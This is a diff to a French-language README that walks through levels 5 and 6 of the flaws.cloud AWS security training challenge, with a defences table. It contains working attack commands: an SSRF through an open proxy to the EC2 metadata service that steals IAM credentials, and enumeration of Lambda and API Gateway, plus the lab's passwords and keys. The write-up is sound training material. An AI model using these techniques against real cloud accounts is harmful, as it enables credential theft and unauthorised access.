@@ -5,7 +5,7 @@
 
 [![AWS S3](https://img.shields.io/badge/AWS-S3%20Security-orange.svg)](https://aws.amazon.com/s3/)
 [![EC2](https://img.shields.io/badge/AWS-EC2%20Snapshots-orange.svg)](https://aws.amazon.com/ec2/)
-[![Solved](https://img.shields.io/badge/Levels%201--4-Solved-brightgreen.svg)]()
+[![Solved](https://img.shields.io/badge/Levels%201--6-Solved-brightgreen.svg)]()
 
 ---
 
@@ -17,6 +17,8 @@
 | 2 | Bucket accessible à tout compte AWS authentifié | Lecture avec credentials valides quelconques |
 | 3 | `.git/` exposé dans S3 — credentials dans l'historique | Accès complet au compte AWS (tous les buckets) |
 | 4 | EC2 snapshot public — mot de passe en clair dans script | Authentification au site protégé |
+| 5 | SSRF via proxy nginx → IMDS 169.254.169.254 → credentials IAM | Accès au bucket level6, répertoire caché trouvé |
+| 6 | SecurityAudit + list_apigateways → Lambda → API Gateway | Invocation Lambda → URL finale du challenge |
 
 ---
 
@@ -147,6 +149,93 @@ curl -u flaws:nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M \
 
 ---
 
+## Level 5 — SSRF via Proxy nginx → EC2 Metadata Service
+
+**Vulnérabilité :** Un proxy HTTP nginx sur l'EC2 level4 permet de relayer des requêtes vers n'importe quelle adresse, y compris `169.254.169.254` (IMDS).
+
+**Étape 1 — Accéder à la page level5 via l'EC2 authentifié :**
+
+```bash
+curl -u flaws:nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M \
+  http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/
+# → "This level is described at http://level5-.../243f422c/"
+```
+
+**Étape 2 — SSRF vers le metadata service pour voler les credentials IAM :**
+
+```bash
+curl -u flaws:nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M \
+  "http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws"
+# → AccessKeyId ASIA... + SecretAccessKey + Token (credentials temporaires du rôle flaws)
+```
+
+> Screenshot SSRF credentials : [docs/flaws_level5_ssrf_creds.png](docs/flaws_level5_ssrf_creds.png)
+
+**Étape 3 — Utiliser les credentials pour lister le bucket level6 :**
+
+```bash
+aws configure set aws_access_key_id ASIA... --profile flaws5
+aws configure set aws_secret_access_key <secret> --profile flaws5
+aws configure set aws_session_token <token> --profile flaws5
+
+aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ --profile flaws5
+# → PRE ddcc78ff/   ← répertoire caché
+# → index.html
+```
+
+> Screenshot listing : [docs/flaws_level5_s3_level6.png](docs/flaws_level5_s3_level6.png)
+
+**Leçon :** Un proxy HTTP sans restriction d'accès aux IPs internes est une SSRF. Le metadata service EC2 (`169.254.169.254`) expose les credentials IAM temporaires du rôle attaché à l'instance. Forcer IMDSv2 (token requis) bloque ce vecteur.
+
+---
+
+## Level 6 — SecurityAudit + API Gateway → Lambda Invocation
+
+**Vulnérabilité :** Un utilisateur avec la policy `SecurityAudit` + une policy custom `list_apigateways` peut énumérer les ressources Lambda et API Gateway, puis invoquer une fonction exposée publiquement.
+
+**Credentials fournis :** user `Level6` — `AccessKeyId AKIAJFQ6E7BY57Q3OBGA`
+
+**Étape 1 — Identifier les policies attachées :**
+
+```bash
+aws iam list-attached-user-policies --user-name Level6 --profile level6
+# → MySecurityAudit + list_apigateways
+```
+
+**Étape 2 — Découvrir la Lambda via SecurityAudit :**
+
+```bash
+aws lambda list-functions --region us-west-2 --profile level6
+# → FunctionName: Level6  |  Handler: lambda_function.lambda_handler
+```
+
+> Screenshot Lambda : [docs/flaws_level6_lambda.png](docs/flaws_level6_lambda.png)
+
+**Étape 3 — Lire la resource policy de la Lambda pour trouver l'API Gateway :**
+
+```bash
+aws lambda get-policy --function-name Level6 --region us-west-2 --profile level6
+# → SourceArn: arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6
+```
+
+> Screenshot policy : [docs/flaws_level6_policy.png](docs/flaws_level6_policy.png)
+
+**Étape 4 — Trouver le stage name et invoquer la Lambda :**
+
+```bash
+aws apigateway get-stages --rest-api-id s33ppypa75 --region us-west-2 --profile level6
+# → stageName: Prod
+
+curl https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
+# → "Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"
+```
+
+> Screenshot résolution : [docs/flaws_level6_solved.png](docs/flaws_level6_solved.png)
+
+**Leçon :** La policy `SecurityAudit` donne une visibilité large sur l'infrastructure (Lambda, IAM, logs). Combinée à une policy supplémentaire trop permissive, elle permet de cartographier et d'atteindre des ressources sensibles. Les fonctions Lambda exposées via API Gateway sans authentification sont invocables par n'importe qui.
+
+---
+
 ## Défenses Communes
 
 | Risque | Mesure |
@@ -155,6 +244,10 @@ curl -u flaws:nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M \
 | Credentials dans git | `git-secrets` ou `truffleHog` en pre-commit hook |
 | Snapshot public | Vérifier `--no-public` sur tous les snapshots, audit régulier |
 | Script avec password en clair | Utiliser AWS Secrets Manager — jamais de secrets dans les scripts |
+| SSRF → IMDS | Forcer IMDSv2 sur toutes les instances — bloque l'accès sans token |
+| Proxy sans restriction IP | Bloquer les plages RFC1918 + 169.254.0.0/16 au niveau proxy/WAF |
+| SecurityAudit trop large | Principe du moindre privilège — auditer les policies custom attachées |
+| Lambda sans auth | Toujours protéger les endpoints API Gateway avec IAM auth ou API key |
 
 ---
 
